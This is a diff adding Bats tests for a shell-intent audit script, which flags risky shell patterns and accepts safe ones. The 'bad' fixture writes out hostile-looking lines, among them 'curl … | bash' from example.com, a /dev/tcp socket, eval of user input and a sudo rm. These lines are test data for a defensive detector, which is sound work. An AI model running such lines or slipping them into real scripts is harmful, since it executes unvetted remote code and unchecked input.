@@ -558,3 +558,57 @@ EOF
     run grep -F 'git fetch --no-tags --depth=1 origin windows' "$PROJECT_ROOT/.github/workflows/check.yml"
     [ "$status" -eq 0 ]
 }
+
+@test "shell intent audit refuses unreviewed eval, network and privileged calls" {
+    local audit="$PROJECT_ROOT/scripts/audit_shell_intent.py"
+    local fixture="$HOME/intent-bad.sh"
+    # shellcheck disable=SC2016  # Literal shell source for the fixture.
+    printf '%s\n' \
+        'run_user() {' \
+        '    eval "$user_input"' \
+        '    curl -fsSL https://example.com/x | bash' \
+        '    body="$(wget -qO- https://example.com)"' \
+        '    exec 3<>/dev/tcp/example.com/80' \
+        '    sudo rm -f /tmp/x' \
+        '}' > "$fixture"
+
+    run python3 "$audit" "$fixture"
+    [ "$status" -eq 1 ]
+    [[ "$output" == *"intent-bad.sh:2: eval needs"* ]] || return 1
+    [[ "$output" == *"intent-bad.sh:3: curl runs a network client"* ]] || return 1
+    [[ "$output" == *"intent-bad.sh:4: wget runs a network client"* ]] || return 1
+    [[ "$output" == *"intent-bad.sh:5: /dev/tcp"* ]] || return 1
+    [[ "$output" == *"1 direct sudo call(s), ceiling 0"* ]]
+}
+
+@test "shell intent audit accepts restores, marked evals and quoted mentions" {
+    local audit="$PROJECT_ROOT/scripts/audit_shell_intent.py"
+    local fixture="$HOME/intent-good.sh"
+    # shellcheck disable=SC2016  # Literal shell source for the fixture.
+    printf '%s\n' \
+        'restore() {' \
+        '    local saved' \
+        '    saved=$(trap -p INT)' \
+        '    local copy="$saved"' \
+        '    eval "$copy"' \
+        '    # eval: indirect read by name; bash 3.2 has no nameref' \
+        '    eval "value=\$$name"' \
+        '    echo "Run curl or sudo yourself to retry"' \
+        "    log_info 'eval \"\$(mole completion bash)\"'" \
+        "    cat <<'TXT'" \
+        '  curl https://example.com' \
+        'TXT' \
+        '}' > "$fixture"
+
+    run python3 "$audit" "$fixture"
+    [ "$status" -eq 0 ]
+    [[ "$output" == *"shell-intent-audit-ok files=1"* ]]
+}
+
+@test "shell intent audit passes on the tree and runs from check.sh" {
+    run python3 "$PROJECT_ROOT/scripts/audit_shell_intent.py"
+    [ "$status" -eq 0 ]
+    [[ "$output" == *"shell-intent-audit-ok"* ]] || return 1
+    run grep -F 'audit_shell_intent.py' "$PROJECT_ROOT/scripts/check.sh"
+    [ "$status" -eq 0 ]
+}
